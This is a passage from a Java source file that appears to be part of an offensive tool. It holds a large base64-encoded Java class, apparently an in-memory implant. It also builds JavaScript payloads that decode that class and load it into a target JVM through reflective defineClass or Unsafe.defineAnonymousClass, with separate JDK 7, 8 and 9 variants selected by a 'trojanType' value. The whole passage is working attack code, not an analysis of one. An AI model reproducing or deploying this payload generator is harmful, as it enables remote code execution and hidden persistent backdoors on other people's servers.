ZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL3V0aWwvQXJyYXlzAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwEAB3ZhbHVlT2YBABYoWilMamF2YS9sYW5nL0Jvb2xlYW47AQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7AQAHaGFzTmV4dAEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAA2FkZAEADGJvb2xlYW5WYWx1ZQEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAKc3RhcnRzV2l0aAEAFShMamF2YS9sYW5nL1N0cmluZzspWgEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAlnZXRNZXRob2QBAAdpc0VtcHR5AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClM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";
        if (trojanType.contains("jdk7")){
            code = "var data= \\u0027" + URLEncoder.encode(base64CodeStr, "utf-8") + "\\u0027;" + "var dataBytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(data);" +
                    "var cloader=java.lang.Thread.currentThread.getContextClassLoader();" +
                    "var sc =cloader.getClass.getSuperClass().getSuperClass().getSuperClass();" +
                    "var m=sc.getDeclaredMethod(\\u0027defineClass\\u0027,\\u0027\\u0027.getBytes.getClass,java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                    "m.setAccessible(true);" +
                    "var off = java.lang.Integer(0);" +
                    "var l = java.lang.Integer(dataBytes,.length);" +
                    "var mc=m.invoke(cloader,dataBytes,off,l);" +
                    "mc.newInstance();";
        }
        else if(trojanType.contains("jdk8")){
            code = "var data= \\u0027" + URLEncoder.encode(base64CodeStr, "utf-8") + "\\u0027;" + "var dataBytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(data);" +
                    "var cloader=java.lang.Thread.currentThread.getContextClassLoader();" +
                    "var m=java.lang.Classloader.class.getDeclaredMethod(\\u0027defineClass\\u0027,\\u0027\\u0027.getBytes.getClass,java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                    "m.setAccessible(true);" +
                    "var mc=m.invoke(cloader,dataBytes,0,dataBytes.length);" +
                    "mc.newInstance();";
        }
        else if(trojanType.contains("jdk9")){
            code = "var data=\\u0027"+ URLEncoder.encode(base64CodeStr, "utf-8") +"\\u0027;" +
                    "var sf = java.lang.Class.forName(\\u0027sun.misc.Unsafe\\u0027);" +
                    "var sfc = sf.getDeclaredField(\\u0027theUnsafe\\u0027);" +
                    "sfc.setAccessible(true);" +
                    "var usf =sfc.get(null);" +
                    "var dataBytes=java.util.Base64.getDecoder().decode(data);" +
                    "var m = usf.defineAnonymousClass(java.io.File.class,dataBytes,null);" +
                    "m.newInstance();";
        }
        return payloadTemplate.replace("{code}", code).replace("\n", "");
    }
}
